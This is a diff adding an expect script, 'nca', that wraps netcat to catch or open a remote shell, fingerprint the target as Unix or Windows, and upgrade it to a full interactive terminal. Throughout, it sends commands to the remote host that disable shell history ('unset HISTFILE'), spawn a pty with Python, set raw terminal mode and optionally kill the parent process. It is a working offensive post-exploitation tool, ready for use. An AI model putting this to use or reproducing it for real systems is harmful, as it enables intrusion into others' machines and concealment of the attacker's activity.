@@ -1,0 +1,205 @@
+#!/usr/bin/expect
+# nca - nc wrapper by SNADO team
+# Requires: expect, nc and optionally tmux
+
+set LISTEN false
+set ADDR "0.0.0.0"
+set PORT 0
+set TMUX false
+set UDP ""
+set KILL true
+
+set argsCount [llength $argv];
+set i 0
+while { $i < $argsCount } {
+    switch [lindex $argv $i] {
+		"-l" {
+			set LISTEN true
+		}
+		"-u" {
+			set UDP "-u"
+		}
+		"-t" {
+			set TMUX true
+		}
+		"-k" {
+			set KILL false
+		}
+		default {
+			if { $i == $argsCount-2 } {
+				set ADDR [lindex $argv $i]
+			} else {
+				set PORT [lindex $argv $i]
+			}
+		}
+	}
+    set i [expr $i+1];
+}
+
+if { $PORT > 0 && ($LISTEN == true || $ADDR != "0.0.0.0") } {
+
+	if { $LISTEN == true } {
+		if { $ADDR == "0.0.0.0" } {
+			set CMD "(nc $UDP -lvp $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		} else {
+			set CMD "(nc $UDP -lvp $PORT -s $ADDR; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		}
+		set MSG "\[\033\[94m*\033\[0m\] Waiting for connections on $ADDR:$PORT"
+		set EXP "onnect"
+	} else {
+		set CMD "(nc -v $UDP $ADDR $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5''\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		#set CMD "($arg3 nc -v $ADDR $PORT; echo -e '\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3')"
+		set MSG "\[\033\[94m*\033\[0m\] Connecting to $ADDR:$PORT"
+		set EXP "open"
+	}
+
+	log_user 0
+	set timeout -1
+	
+	spawn "/bin/bash"
+	send "$CMD\n"
+	puts $MSG
+
+	expect {
+		$EXP {
+			puts "\[\033\[92m+\033\[0m\] Connected"
+			
+			send "echo 'un''ix'\n"
+			#sleep 0.2
+			sleep 0.5
+			expect {
+				"unix" {
+					puts "\[\033\[92m+\033\[0m\] Unix detected"
+					
+					if { $LISTEN == true && $TMUX == true } {
+						send \x1A
+						if { $ADDR != "0.0.0.0" } {
+							send "tmux new-window -d '$::argv0 -l -t $ADDR $PORT'\n"
+						} else {
+							send "tmux new-window -d '$::argv0 -l -t $PORT'\n"
+						}
+						send "fg\n"
+					}
+				}
+				"'un''ix'" {
+					puts "\[\033\[92m+\033\[0m\] Windows detected"
+					
+					if { $LISTEN == true && $TMUX == true } {
+						send \x1A
+						if { $ADDR != "0.0.0.0" } {
+							send "tmux new-window -d '$::argv0 -l -t $ADDR $PORT'\n"
+						} else {
+							send "tmux new-window -d '$::argv0 -l -t $PORT'\n"
+						}
+						send "fg\n"
+						
+						expect ")"
+						expect ")"
+						expect ")"
+					}
+										
+					send "\n"
+					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3" return
+					
+					puts ""
+					puts "\[\033\[94m*\033\[0m\] Terminated"
+					exit
+				}
+			}
+			send "unset HISTFILE\n"
+			send "p=`which python python2 python3 python2.7 python3.5 python2.6 python3.4 python3.6 | xargs | cut -d ' ' -f 1`;if \[ ! -z \$p \]; then echo 'P''YTHON-OK'; \$p -c 'import pty;pty.spawn(\"/bin/bash\")'; else echo 'P''YTHON-ERR'; fi\n"
+			expect {
+				"PYTHON-OK" {
+					set ROWS [exec tput lines]
+					set COLS [exec tput cols]
+					puts "\[\033\[92m+\033\[0m\] python found"
+					expect {
+						"$ " {
+						}
+						"# " {
+						}
+						"% " {
+						}
+					}
+					send \x1A
+					puts "\[\033\[94m*\033\[0m\] Setting terminal"
+					expect ":"
+					send "stty raw -echo\n"
+					send "fg\n"
+					expect {
+						"$ " {
+						}
+						"# " {
+						}
+						"% " {
+						}
+					}
+					if { $KILL == true } {
+						send "kill -s 9 `ps -fp \$PPID | awk \"/\$PPID/\"' { print \$3 } '`\n"
+					}
+					send "reset\n"
+					expect {
+						"$ " {
+						}
+						"# " {
+						}
+						"% " {
+						}
+					}
+					send "id\n"
+					expect {
+						"Terminal type?" {
+							send "xterm-256color\n"
+						}
+						"uid=" {
+						}
+					}
+					send "stty rows $ROWS columns $COLS\n"
+					send "export SHELL=bash\n"
+					send "export TERM=xterm-256color\n"
+					send "unset HISTFILE\n"
+					send "clear\n"
+					#send "uname -a; id\n"
+					sleep 0.5
+					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\n" return
+					
+				}
+				"PYTHON-ERR" {
+					puts "\[\033\[91m-\033\[0m\] python not found"
+					puts "\[\033\[92m+\033\[0m\] Interacting"
+					send "uname -a; id\n"
+					interact -o "\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3\xf5\xe7\xf3" return
+				}
+			}
+			puts ""
+			puts "\[\033\[94m*\033\[0m\] Terminated"
+		}
+		"Connection refused" {
+			puts "\[\033\[91m-\033\[0m\] Connection refused"
+		}
+		"Permission denied" {
+			puts "\[\033\[91m-\033\[0m\] Permission denied"
+		}
+		"forward host lookup failed" {
+			puts "\[\033\[91m-\033\[0m\] Forward host lookup failed"
+		}
+		"Cannot assign requested address" {
+			puts "\[\033\[91m-\033\[0m\] Cannot assign requested address"
+		}
+		"invalid port" {
+			puts "\[\033\[91m-\033\[0m\] Invalid port"
+		}
+		"invalid local port" {
+			puts "\[\033\[91m-\033\[0m\] Invalid local port"
+		}
+		"Address already in use" {
+			puts "\[\033\[91m-\033\[0m\] Address already in use"
+		}
+		"*** buffer overflow detected ***" {
+			puts "\[\033\[91m-\033\[0m\] *** buffer overflow detected ***"
+		}
+	}
+	exit
+} else {
+	puts "Usage: $::argv0 \[-l\] \[-t\] \[addr\] port"
+}
